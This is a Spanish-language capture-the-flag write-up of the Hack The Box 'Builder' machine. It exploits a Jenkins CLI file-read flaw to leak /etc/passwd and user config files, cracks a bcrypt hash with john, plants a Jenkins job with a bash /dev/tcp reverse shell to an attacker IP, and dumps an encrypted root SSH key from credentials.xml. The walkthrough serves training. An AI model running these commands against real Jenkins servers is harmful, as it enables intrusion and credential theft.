---
layout: post
title: HTB Builder
date: 2024-02-19 22:42:53 -0500
categories:
  - HTB
  - Medium
tags:
  - AD
  - Windows
  - Bloodhound
  - Asreproast
  - ACL
  - DCSync
  - RPC
  - Groups
image:
  path: /forest/preview.png
  alt: Builder
---

## Resumen 
![logo](/forest/logo.png){: .right w="200" h="200" }


## Reconocimiento

Para empezar, se realiza un **ping** para saber si hay conectividad con la máquina.

```bash
ping 10.10.11.10 -c 1
PING 10.10.11.10 (10.10.11.10) 56(84) bytes of data.
64 bytes from 10.10.11.10: icmp_seq=1 ttl=63 time=138 ms

--- 10.10.11.10 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 137.780/137.780/137.780/0.000 ms
```
{: .nolineno}


### Escaneo de Puertos
Luego se realiza un **escaneo de puertos** para ver cuáles se encuentran abiertos dentro de la máquina.
```bash
nmap -p- --min-rate 3000 10.10.11.10 -Pn -oG TCPports

Nmap scan report for 10.10.11.10

PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```
{: .nolineno}

Gracias a la información obtenida, se puede realizar un **escaneo mucho más profundo** para saber qué **tecnologías** y **versiones** está utilizando la máquina en el puerto **22** y en el **8080**.

```bash
nmap -p22,8080 --min-rate 3000 -sVC -Pn -oN  TCPversions 10.10.11.10

Host is up (0.12s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
|_http-server-header: Jetty(10.0.18)
| http-robots.txt: 1 disallowed entry 
|_/
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}
## Enumeración


Como se cuenta con dos puntos en los que se puede llegar a analizar la máquina, se decide empezar a revisar la web que está en el puerto **8080**. Por lo que se hace uso de **WhatWeb** para ver qué tecnologías está utilizando la misma.

```bash
whatweb http://10.10.11.10:8080/

http://10.10.11.10:8080/ [200 OK] Cookies[JSESSIONID.4fa35673], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(10.0.18)], HttpOnly[JSESSIONID.4fa35673], IP[10.10.11.10], Jenkins[2.441], Jetty[10.0.18], OpenSearch[/opensearch.xml], Script[application/json,text/javascript], Title[Dashboard [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson-theme,referrer-policy,cross-origin-opener-policy,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
```
{: .nolineno}

Al entrar al panel web del Jenkins se puede ver algo muy importante, que es la **versión** del mismo.

![version](/builder/version.png)

Y al revisar un poco sobre las funcionalidades de la aplicación, se puede enumerar un usuario llamado **jennifer**.

![users](/builder/users.png)

Dentro de la opción de **credenciales** se puede ver que existe otro usuario, y dentro de la información del mismo se muestra que sus credenciales se encuentran guardadas dentro del servidor.

![creds](/builder/creds.png)

Por el lado de la web no parece haber más información interesante, sin embargo, al investigar en internet sobre la versión del servicio, parece que hace poco se ha publicado un **CVE** que permite a los atacantes realizar un ataque de **information disclosure** mediante la **CLI** de Jenkins.

![cve](/builder/cve.png)



![explain](/builder/explain.png)

## Explotación

### Nota 

Al buscar en internet parece haber algunos scripts en GitHub para automatizar el ataque. Lamentablemente, ninguno parece funcionar correctamente, por lo que la forma más rápida parece ser realizando la **explotación manual**. Por lo que se va a realizar el ataque con la explicación de [**0xdf**](https://www.youtube.com/watch?v=toPJhfy-wvw)

Para realizar el ataque es necesario contar el cliente de Jenkins, por lo que se puede descargar directamente del proyecto bajo la siguiente ruta `https://jenkins.example.com/jnlpJars/jenkins-cli.jar`

![cli](/builder/cli.png)

Para descargarlo en nuestra **ruta de trabajo** se puede hacer uso  de `wget`:

```bash
wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar

--2024-02-20 13:25:46--  http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
Connecting to 10.10.11.10:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3623400 (3.5M) [application/java-archive]
Saving to: ‘jenkins-cli.jar’

jenkins-cli.jar                  100%[==========================================================>]   3.46M   954KB/s    in 3.7s    

2024-02-20 13:25:50 (954 KB/s) - ‘jenkins-cli.jar’ saved [3623400/3623400]
```
{: .nolineno}


El chiste del ataque consiste en que gracias a las funcionalidades de la **CLI**, se le puede pasar como argumento a cada una de las funcionalidades la cadena **"@/rutaArchivo"** y dentro de la respuesta como error envía una parte del archivo que se quiere revisar.

```bash
java -jar jenkins-cli.jar -s  http://10.10.11.10:8080 help '@/etc/passwd'
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
java -jar jenkins-cli.jar help [COMMAND]
Lists all the available commands or a detailed description of single command.

---> COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash) <--- 
```
{: .nolineno}

El problema es que no se muestra todo el output del archivo, ya que el mensaje de error no está preparado para mostrar más de una línea. Por lo que se prueba revisar el archivo **/etc/hostname** y en este caso se puede ver el nombre de la computadora.

```bash
java -jar jenkins-cli.jar -s  http://10.10.11.10:8080 help '@/etc/hostname'
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
  add-job-to-view
    Adds jobs to view.
  build
    Builds a job, and optionally waits until its completion.
  cancel-quiet-down
    Cancel the effect of the "quiet-down" command.
  clear-queue
    Clears the build queue.

...
snip
...

---> ERROR: No such command 0f52c222a4cc. Available commands are above. <--- 
```
{: .nolineno}

### Creación de Script 


El punto interesante es que algunas funcionalidades tienen mensajes de error que pueden imprimir más información en pantalla, por lo que se puede encontrar cuál es la que nos sirve para ver toda la salida de un archivo. Por lo que vamos a intentar **scriptearlo**, primero vamos a extraer todos los comandos que tiene la **CLI** y los vamos a guardar como una lista dentro de un **archivo** con los siguientes comandos:

```bash
 java -jar jenkins-cli.jar -s  http://10.10.11.10:8080 help   &> commands  
```
{: .nolineno}

```bash
cat commands | tr -d " " | grep '^[a-z]' > commandsFinal.txt
```
{: .nolineno}

Y si se realizó de forma correcta, se obtiene el siguiente archivo.

```bash
add-job-to-view
build
cancel-quiet-down
clear-queue
connect-node
console
copy-job
create-credentials-by-xml
create-credentials-domain-by-xml
create-job
create-node
create-view
declarative-linter
delete-builds
delete-credentials
delete-credentials-domain
delete-job
delete-node
delete-view
disable-job
disable-plugin
disconnect-node
enable-job
enable-plugin
get-credentials-as-xml
get-credentials-domain-as-xml
get-job
get-node
get-view
groovy
groovysh
help
import-credentials-as-xml
install-plugin
keep-build
list-changes
list-credentials
list-credentials-as-xml
list-credentials-context-resolvers
list-credentials-providers
list-jobs
list-plugins
mail
offline-node
online-node
quiet-down
reload-configuration
reload-job
remove-job-from-view
replay-pipeline
restart
restart-from-stage
safe-restart
safe-shutdown
session-id
set-build-description
set-build-display-name
shutdown
stop-builds
update-credentials-by-xml
update-credentials-domain-by-xml
update-job
update-node
update-view
version
wait-node-offline
wait-node-online
who-am-i
```

Ahora se crea un archivo con una versión del comando de la **CLI vulnerable**, pero cada línea tiene una versión en la que se usa una funcionalidad diferente.


```bash
cat commandsFinal.txt | while read command ; do echo   java -jar jenkins-cli.jar -s  http://10.10.11.10:8080 $command '@/etc/passwd' ; done   >   jenkinsCommand.txt
```
{: .nolineno}


Ahora, por último, se puede hacer un ciclo que pruebe cada uno de los comandos, y que guarde el largo de la salida para cada una de las funcionalidades de la **CLI**. Gracias a esto, se puede saber cuáles de estas devuelven toda la información y cuáles no.


```bash
cat jenkinsCommand.txt | while read command ; do echo $command |  bash  &> file ; number=$(wc -l file); jenkinCommand=$(echo  $command | awk '{print $6}' );  echo "$jenkinCommand $number" ; rm file ;  done  &> NumberLines.txt
```
{: .nolineno}

Ahora se puede revisar el **archivo de salida** para ver obtener la mejor opción para el **ataque**:

```bash
cat NumberLines.text

add-job-to-view 3 file
build 3 file
cancel-quiet-down 5 file
clear-queue 5 file
connect-node 22 file
console 3 file
copy-job 3 file
create-credentials-by-xml 7 file
create-credentials-domain-by-xml 6 file
create-job 6 file
create-node 6 file
create-view 7 file
declarative-linter 5 file
delete-builds 3 file
delete-credentials 8 file
delete-credentials-domain 7 file
delete-job 22 file
delete-node 22 file
delete-view 22 file
disable-job 6 file
disable-plugin 3 file
disconnect-node 22 file
enable-job 6 file
enable-plugin 3 file
get-credentials-as-xml 8 file
get-credentials-domain-as-xml 7 file
get-job 3 file
get-node 3 file
get-view 3 file
groovy 3 file
groovysh 3 file
help 6 file
import-credentials-as-xml 8 file
install-plugin 3 file
keep-build 7 file
list-changes 3 file
list-credentials 6 file
list-credentials-as-xml 9 file
list-credentials-context-resolvers 5 file
list-credentials-providers 5 file
list-jobs 6 file
list-plugins 6 file
mail 5 file
offline-node 22 file
online-node 22 file
quiet-down 10 file
reload-configuration 5 file
reload-job 22 file
remove-job-from-view 3 file
replay-pipeline 3 file
restart 5 file
restart-from-stage 8 file
safe-restart 6 file
safe-shutdown 5 file
session-id 5 file
set-build-description 3 file
set-build-display-name 3 file
shutdown 5 file
stop-builds 3 file
update-credentials-by-xml 8 file
update-credentials-domain-by-xml 7 file
update-job 3 file
update-node 3 file
update-view 3 file
version 5 file
wait-node-offline 3 file
wait-node-online 3 file
who-am-i 5 file
```

### Lectura de Archivos Dentro del Servidor


```bash
java -jar jenkins-cli.jar -s  http://10.10.11.10:8080 connect-node  '@/etc/passwd'

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" exists.
root:x:0:0:root:/root:/bin/bash: No such agent "root:x:0:0:root:/root:/bin/bash" exists.
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin" exists.
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin" exists.
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin: No such agent "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin" exists.
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin" exists.
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin" exists.
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin" exists.
bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent "bin:x:2:2:bin:/bin:/usr/sbin/nologin" exists.
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin" exists.
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin" exists.
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin: No such agent "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin" exists.
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin" exists.
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash: No such agent "jenkins:x:1000:1000::/var/jenkins_home:/bin/bash" exists.
games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent "games:x:5:60:games:/usr/games:/usr/sbin/nologin" exists.
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin" exists.
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" exists.
sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent "sys:x:3:3:sys:/dev:/usr/sbin/nologin" exists.
sync:x:4:65534:sync:/bin:/bin/sync: No such agent "sync:x:4:65534:sync:/bin:/bin/sync" exists.

ERROR: Error occurred while performing this command, see previous stderr output.
```
{: .nolineno}


```bash
java -jar jenkins-cli.jar -s  http://10.10.11.10:8080 connect-node  '@/var/jenkins_home/user.txt'
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

ERROR: No such agent "445f8e9664ef97f38e91b9ee0bf83553" exists.
```
{: .nolineno}

```bash
java -jar jenkins-cli.jar -s  http://10.10.11.10:8080 connect-node  '@/var/jenkins_home/credentials.xml'
java -jar jenkins-cli.jar -s  http://10.10.11.10:8080 connect-node  '@/var/jenkins_home/config.xml' 
```


```bash
java -jar jenkins-cli.jar -s  http://10.10.11.10:8080 connect-node  '@/var/jenkins_home/users/users.xml'

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
<?xml version='1.1' encoding='UTF-8'?>: No such agent "<?xml version='1.1' encoding='UTF-8'?>" exists.
      <string>jennifer_12108429903186576833</string>: No such agent "      <string>jennifer_12108429903186576833</string>" exists.
  <idToDirectoryNameMap class="concurrent-hash-map">: No such agent "  <idToDirectoryNameMap class="concurrent-hash-map">" exists.
    <entry>: No such agent "    <entry>" exists.
      <string>jennifer</string>: No such agent "      <string>jennifer</string>" exists.
  <version>1</version>: No such agent "  <version>1</version>" exists.
</hudson.model.UserIdMapper>: No such agent "</hudson.model.UserIdMapper>" exists.
  </idToDirectoryNameMap>: No such agent "  </idToDirectoryNameMap>" exists.
<hudson.model.UserIdMapper>: No such agent "<hudson.model.UserIdMapper>" exists.
    </entry>: No such agent "    </entry>" exists.

ERROR: Error occurred while performing this command, see previous stderr output.
```
{: .nolineno}


```bash
java -jar jenkins-cli.jar -s  http://10.10.11.10:8080 connect-node  '@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml'
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">: No such agent "    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">" exists.
    <hudson.search.UserSearchProperty>: No such agent "    <hudson.search.UserSearchProperty>" exists.
      <roles>: No such agent "      <roles>" exists.
    <jenkins.security.seed.UserSeedProperty>: No such agent "    <jenkins.security.seed.UserSeedProperty>" exists.
      </tokenStore>: No such agent "      </tokenStore>" exists.
    </hudson.search.UserSearchProperty>: No such agent "    </hudson.search.UserSearchProperty>" exists.
      <timeZoneName></timeZoneName>: No such agent "      <timeZoneName></timeZoneName>" exists.
  <properties>: No such agent "  <properties>" exists.
    <jenkins.security.LastGrantedAuthoritiesProperty>: No such agent "    <jenkins.security.LastGrantedAuthoritiesProperty>" exists.
      <flags/>: No such agent "      <flags/>" exists.
    <hudson.model.MyViewsProperty>: No such agent "    <hudson.model.MyViewsProperty>" exists.
</user>: No such agent "</user>" exists.
    </jenkins.security.ApiTokenProperty>: No such agent "    </jenkins.security.ApiTokenProperty>" exists.
      <views>: No such agent "      <views>" exists.
        <string>authenticated</string>: No such agent "        <string>authenticated</string>" exists.
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.200.vb_9327d658781">: No such agent "    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.200.vb_9327d658781">" exists.
<user>: No such agent "<user>" exists.
          <name>all</name>: No such agent "          <name>all</name>" exists.
  <description></description>: No such agent "  <description></description>" exists.
      <emailAddress>jennifer@builder.htb</emailAddress>: No such agent "      <emailAddress>jennifer@builder.htb</emailAddress>" exists.
      <collapsed/>: No such agent "      <collapsed/>" exists.
    </jenkins.security.seed.UserSeedProperty>: No such agent "    </jenkins.security.seed.UserSeedProperty>" exists.
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>: No such agent "    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>" exists.
    </hudson.model.MyViewsProperty>: No such agent "    </hudson.model.MyViewsProperty>" exists.
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>: No such agent "      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>" exists.
          <filterQueue>false</filterQueue>: No such agent "          <filterQueue>false</filterQueue>" exists.
    <jenkins.security.ApiTokenProperty>: No such agent "    <jenkins.security.ApiTokenProperty>" exists.
      <primaryViewName></primaryViewName>: No such agent "      <primaryViewName></primaryViewName>" exists.
      </views>: No such agent "      </views>" exists.
    </hudson.model.TimeZoneProperty>: No such agent "    </hudson.model.TimeZoneProperty>" exists.
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1319.v7eb_51b_3a_c97b_">: No such agent "    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1319.v7eb_51b_3a_c97b_">" exists.
    </hudson.model.PaneStatusProperties>: No such agent "    </hudson.model.PaneStatusProperties>" exists.
    </hudson.tasks.Mailer_-UserProperty>: No such agent "    </hudson.tasks.Mailer_-UserProperty>" exists.
        <tokenList/>: No such agent "        <tokenList/>" exists.
    <jenkins.console.ConsoleUrlProviderUserProperty/>: No such agent "    <jenkins.console.ConsoleUrlProviderUserProperty/>" exists.
        </hudson.model.AllView>: No such agent "        </hudson.model.AllView>" exists.
      <timestamp>1707318554385</timestamp>: No such agent "      <timestamp>1707318554385</timestamp>" exists.
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>: No such agent "          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>" exists.
  </properties>: No such agent "  </properties>" exists.
    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>: No such agent "    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>" exists.
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>: No such agent "    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>" exists.
    <hudson.security.HudsonPrivateSecurityRealm_-Details>: No such agent "    <hudson.security.HudsonPrivateSecurityRealm_-Details>" exists.
      <insensitiveSearch>true</insensitiveSearch>: No such agent "      <insensitiveSearch>true</insensitiveSearch>" exists.
          <properties class="hudson.model.View$PropertyList"/>: No such agent "          <properties class="hudson.model.View$PropertyList"/>" exists.
    <hudson.model.TimeZoneProperty>: No such agent "    <hudson.model.TimeZoneProperty>" exists.
        <hudson.model.AllView>: No such agent "        <hudson.model.AllView>" exists.
    </hudson.security.HudsonPrivateSecurityRealm_-Details>: No such agent "    </hudson.security.HudsonPrivateSecurityRealm_-Details>" exists.
      <providerId>default</providerId>: No such agent "      <providerId>default</providerId>" exists.
      </roles>: No such agent "      </roles>" exists.
    </jenkins.security.LastGrantedAuthoritiesProperty>: No such agent "    </jenkins.security.LastGrantedAuthoritiesProperty>" exists.
    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>: No such agent "    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>" exists.
    <hudson.model.PaneStatusProperties>: No such agent "    <hudson.model.PaneStatusProperties>" exists.
<?xml version='1.1' encoding='UTF-8'?>: No such agent "<?xml version='1.1' encoding='UTF-8'?>" exists.
  <fullName>jennifer</fullName>: No such agent "  <fullName>jennifer</fullName>" exists.
      <seed>6841d11dc1de101d</seed>: No such agent "      <seed>6841d11dc1de101d</seed>" exists.
  <id>jennifer</id>: No such agent "  <id>jennifer</id>" exists.
  <version>10</version>: No such agent "  <version>10</version>" exists.
      <tokenStore>: No such agent "      <tokenStore>" exists.
          <filterExecutors>false</filterExecutors>: No such agent "          <filterExecutors>false</filterExecutors>" exists.
    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>: No such agent "    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>" exists.
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>: No such agent "      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>" exists.
```
{: .nolineno}


```bash
cat hash
$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a
```
{: .nolineno}

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt

Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
princess         (?)     
1g 0:00:00:00 DONE (2024-02-20 14:37) 4.347g/s 156.5p/s 156.5c/s 156.5C/s 123456..liverpool
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
{: .nolineno}

![login](/builder/login.png)


![dasboard](/builder/dashboard.png)


### Ganar Una Shell


![job](/builder/job.png)


![name](/builder/name.png)

![select](/builder/select.png)


![shell](/builder/shell.png)

```bash
bash -c 'exec bash -i &>/dev/tcp/10.10.14.148/9090 <&1'
```
{: .nolineno}


![deploy](/builder/deploy.png)


```bash
nc -lvp 9090
listening on [any] 9090 ...
10.10.11.10: inverse host lookup failed: Host name lookup failure
connect to [10.10.14.148] from (UNKNOWN) [10.10.11.10] 51350
bash: cannot set terminal process group (7): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@0f52c222a4cc:~/workspace/madlies$ whoami
whoami
jenkins
```
{: .nolineno}




## Escalada de Privilegios


### Obtenerla ID_RSA Cifrada Desde Reverse Shell

```bash
cat credentials.xml
```
{: .nolineno}

```xml
<?xml version='1.1' encoding='UTF-8'?>
<com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin="credentials@1319.v7eb_51b_3a_c97b_">
  <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
    <entry>
      <com.cloudbees.plugins.credentials.domains.Domain>
        <specifications/>
      </com.cloudbees.plugins.credentials.domains.Domain>
      <java.util.concurrent.CopyOnWriteArrayList>
        <com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey plugin="ssh-credentials@308.ve4497b_ccd8f4">
          <scope>GLOBAL</scope>
          <id>1</id>
          <description></description>
          <username>root</username>
          <usernameSecret>false</usernameSecret>
          <privateKeySource class="com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey$DirectEntryPrivateKeySource">
            <privateKey>{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}</privateKey>
          </privateKeySource>
